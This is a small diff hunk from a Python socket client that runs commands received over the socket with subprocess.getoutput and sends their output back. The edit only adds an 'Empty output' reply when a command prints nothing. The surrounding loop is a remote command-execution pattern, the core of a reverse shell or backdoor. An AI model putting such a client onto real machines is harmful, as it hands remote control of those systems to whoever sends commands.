@@ -15,7 +15,10 @@ def client() -> None:
             break
         
         output = subprocess.getoutput(command)
-        s.send(output.encode())
+        if (output):
+            s.send(output.encode())
+        else:
+            s.send('Empty output'.encode())
         
     s.close()
 
